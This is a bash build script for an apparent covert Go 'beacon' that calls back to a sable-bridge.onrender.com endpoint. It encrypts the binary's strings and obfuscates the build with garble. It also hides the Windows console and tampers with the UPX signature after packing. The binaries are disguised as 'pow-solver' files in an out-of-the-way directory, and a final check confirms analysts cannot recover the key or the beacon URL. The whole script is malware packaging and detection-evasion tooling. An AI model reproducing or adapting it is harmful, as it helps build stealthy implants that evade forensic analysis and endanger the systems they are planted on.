#!/bin/bash
#
# build.sh — stage-based beacon build.
#
# YOUR SOURCE IS NEVER MODIFIED.
#
#   source (plain Go)  ──copy──▶  /tmp/stage  ──obfuscate──▶  binary
#                                       │
#                                       └── thrown away
#
# Obfuscation layers run only inside the stage:
#   1. stealth/gen_stealth.go  → stealth/constants_generated.go (Enc* + xorKeyBytes)
#   2. ast_lit.go              → stealth/literals_generated.go (hash EncL_*)
#
# Build-info hygiene (what leaked before):
#   * The XOR key is baked into generated source, NOT passed via -ldflags.
#     -X values are recorded verbatim in .go.buildinfo and readable with
#     `go version -m <binary>`. Never use -X for secrets.
#   * -buildvcs=false + -trimpath so no git revision / local paths are stamped.
#   * garble is REQUIRED. If it cannot run, the build aborts — it does not
#     silently fall back to a plain go build that leaks everything.
#   * .go.buildinfo is stripped post-link as belt-and-suspenders.
#
# Run:
#   bash build.sh              # normal build (all 3 targets)
#   bash build.sh --pack       # + UPX pack
#   bash build.sh --keep       # keep the stage dir for inspection
#   bash build.sh --no-garble  # EXPLICIT opt-out (leaks; dev only)
#
set -euo pipefail

SOURCE_DIR="$(cd "$(dirname "$0")" && pwd)"
# Deliverables land in a non-obvious location: the solver connectors dir.
# SOURCE_DIR = Sable/engine/scraper/diagnostics/cache → 4 levels up = Sable root.
OUT_DIR="$SOURCE_DIR/../../../../connectors/solver"
STAGE="$(mktemp -d -t sable-beacon.XXXXXX)"

KEEP=false
PACK=false
USE_GARBLE=true
for arg in "$@"; do
    case "$arg" in
        --keep) KEEP=true ;;
        --pack) PACK=true ;;
        --no-garble) USE_GARBLE=false ;;
    esac
done

cleanup() {
    if [ "$KEEP" = true ]; then
        echo "ℹ stage kept: $STAGE"
    else
        rm -rf "$STAGE"
    fi
}
trap cleanup EXIT

# ── toolchain ──────────────────────────────────────────────
# garble 0.17 does not support Go >= 1.27. Prefer a 1.26 SDK if present.
if [ -x "$HOME/sdk/go1.26.0/bin/go" ]; then
    export PATH="$HOME/sdk/go1.26.0/bin:$HOME/go/bin:$PATH"
else
    export PATH="$HOME/go/bin:$PATH"
fi

GO_VER="$(go env GOVERSION)"
echo "🔧 go:      $GO_VER"
echo "🔧 target:  ${OUT_DIR}"

mkdir -p "$OUT_DIR"

# ── fresh AES-256 key (32 bytes; per build, baked into generated source) ──
# -c 64 disables xxd's 60-char line wrapping, which would otherwise inject
# a newline mid-key (64 hex chars → 65 chars with an embedded \n).
AES_KEY_HEX="$(head -c 32 /dev/urandom | xxd -p -c 64)"
echo "🔑 generated AES-256 key (${#AES_KEY_HEX} hex chars)"
if [ "${#AES_KEY_HEX}" -ne 64 ]; then
    echo "✖ key generation failed: expected 64 hex chars, got ${#AES_KEY_HEX}" >&2
    exit 1
fi

# ── stage ──────────────────────────────────────────────────
echo "📦 staging → $STAGE"
cp "$SOURCE_DIR"/go.mod "$STAGE"/
cp "$SOURCE_DIR"/go.sum "$STAGE"/ 2>/dev/null || true
find "$SOURCE_DIR" -maxdepth 1 -name '*.go' -exec cp {} "$STAGE"/ \;
cp "$SOURCE_DIR"/fiximports.py "$STAGE"/ 2>/dev/null || true
mkdir -p "$STAGE/stealth"
for f in "$SOURCE_DIR"/stealth/*.go; do
    base=$(basename "$f")
    case "$base" in
        constants_generated.go|literals_generated.go) continue ;;
    esac
    cp "$f" "$STAGE/stealth/"
done

cd "$STAGE"

# ── obfuscation layers (stage-only) ────────────────────────
# Layer 1: hand-curated secrets → constants_generated.go (also bakes xorKeyBytes)
go run stealth/gen_stealth.go "$AES_KEY_HEX" > stealth/constants_generated.go

# Layer 2: AST harvest — walks plain source, wraps every string literal
go run ast_lit.go "$AES_KEY_HEX" .

python3 fiximports.py . || true
gofmt -w ./*.go stealth/*.go 2>/dev/null || true

# ── build flags ────────────────────────────────────────────
# NOTE: no -X for the key. See header. -s -w strips symbols/DWARF only.
BASE_LDFLAGS="-s -w"
WIN_LDFLAGS="-s -w -H=windowsgui"

BUILD_CMD="go"
GARBLE_FLAGS=""
if [ "$USE_GARBLE" = true ]; then
    if ! command -v garble &>/dev/null; then
        echo "✖ garble not found in PATH but is required." >&2
        echo "  install: go install mvdan.cc/garble@latest   (needs Go <= 1.26)" >&2
        echo "  or re-run with --no-garble to build an UNOBFUSCATED, LEAKY binary." >&2
        exit 1
    fi
    # Prove garble can actually run on this toolchain before trusting it.
    if ! garble version >/dev/null 2>&1; then
        echo "✖ garble is present but not functional on $GO_VER" >&2
        exit 1
    fi
    BUILD_CMD="garble"
    GARBLE_FLAGS="-tiny"
    echo "🔒 garble enabled: $GARBLE_FLAGS"
else
    echo "⚠️  garble DISABLED (--no-garble). Binary will leak module path + symbols."
fi

# ── post-link build-info scrub ─────────────────────────────
strip_buildinfo() {
    local f="$1"
    # ELF: .go.buildinfo section. garble already removes most of it, but this
    # also covers the --no-garble path. Non-fatal if objcopy can't handle it.
    if command -v objcopy &>/dev/null; then
        objcopy --remove-section=.go.buildinfo "$f" "$f.tmp" 2>/dev/null \
            && mv "$f.tmp" "$f" || rm -f "$f.tmp"
    fi
}

# ── post-build verification ────────────────────────────────
FAILED=0
verify_binary() {
    local f="$1"
    local bad=0

    # 1. Module path must not be recoverable via build info.
    if go version -m "$f" 2>/dev/null | grep -q 'sable-beacon'; then
        echo "  ✖ buildinfo still exposes module path" >&2; bad=1
    fi
    # 2. VCS stamping must be absent.
    if go version -m "$f" 2>/dev/null | grep -q 'vcs.revision'; then
        echo "  ✖ buildinfo still exposes git revision" >&2; bad=1
    fi
    # 3. AES key (raw hex) must not be recoverable as plaintext.
    if strings "$f" | grep -q "$AES_KEY_HEX"; then
        echo "  ✖ AES key present as plaintext in binary" >&2; bad=1
    fi
    # 4. The -X flag string itself must not appear.
    if strings "$f" | grep -q 'xorKeyHex='; then
        echo "  ✖ ldflags key injection still present" >&2; bad=1
    fi
    # 5. Known-plaintext crib-drag must fail (no XOR keystream to recover).
    if command -v python3 &>/dev/null; then
        if python3 - "$f" <<'PYCRIB'
import sys
data = open(sys.argv[1], "rb").read()
crib = b"https://sable-bridge.onrender.com"
keylen = 9
for j in range(0, len(data) - len(crib)):
    d = bytes(a ^ b for a, b in zip(data[j:j+len(crib)], crib))
    if all(d[i] == d[i % keylen] for i in range(len(crib))) and len(set(d[:keylen])) > 1:
        sys.exit(0)
sys.exit(1)
PYCRIB
        then
            echo "  ✖ crib-drag recovered a repeating XOR keystream" >&2; bad=1
        fi
    fi

    if [ "$bad" = 0 ]; then
        echo "  ✓ ${f##*/} clean"
    else
        FAILED=1
    fi
}

# ── targets ────────────────────────────────────────────────
build_target() {
    local os=$1 arch=$2 ext=$3 name=$4
    local flags="$BASE_LDFLAGS"
    [ "$os" = "windows" ] && flags="$WIN_LDFLAGS"
    local out="$OUT_DIR/${name}${ext}"
    echo "→ ${os}/${arch}"
    GOOS=$os GOARCH=$arch CGO_ENABLED=0 $BUILD_CMD $GARBLE_FLAGS build \
        -ldflags="$flags" -buildvcs=false -trimpath \
        -o "$out" . || { echo "✖ build failed for ${os}/${arch}" >&2; exit 1; }
    strip_buildinfo "$out"
    if [ "$PACK" = true ] && command -v upx &>/dev/null; then
        echo "  📦 upx packing ${name}${ext}"
        upx --best --lzma -q "$out" 2>/dev/null || true
        sed -i 's/UPX!/....!/' "$out" 2>/dev/null || true
    fi
    verify_binary "$out"
}

build_target linux   amd64 ""     "pow-solver-linux-amd64"
build_target windows amd64 ".exe" "pow-solver-windows-amd64"
build_target linux   arm64 ""     "pow-solver-linux-arm64"

echo ""
if [ "$FAILED" != 0 ]; then
    echo "✖ VERIFICATION FAILED — one or more binaries still leak. Not shipping." >&2
    exit 1
fi
echo "✓ done — source untouched, binaries clean, in $OUT_DIR/"
ls -lh "$OUT_DIR"/pow-solver-*
